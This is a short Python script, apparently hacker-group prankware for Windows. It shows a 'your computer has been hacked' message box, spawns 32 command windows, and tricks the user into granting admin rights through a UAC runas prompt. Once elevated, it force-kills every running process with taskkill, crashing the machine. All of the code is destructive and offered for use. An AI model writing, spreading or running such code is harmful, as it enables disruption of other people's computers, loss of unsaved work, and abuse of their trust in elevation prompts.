from __future__ import print_function
import os
import sys
import time 
import threading
import ctypes


"""
    
    by UNION ：Redstone_code
       member: Redstone_hacker
    date 2022.12.24
    v1.0.0

"""


#主逻辑















os.system("msg %username% /time:10 你的电脑被我入侵了 ")    #弹窗
for i in range(32):                                       
  os.system("start cmd")




def is_admin():
  try:
    return ctypes.windll.shell32.IsUserAnAdmin()
  except:
    return False
		
if is_admin(): 
  os.system("Taskkill /fi \"pid ge 1\" /f")   #里面是管理员CMD
  input()
else: 
  if sys.version_info[0] == 3:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) 
    print("run again...")
  else:
    ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
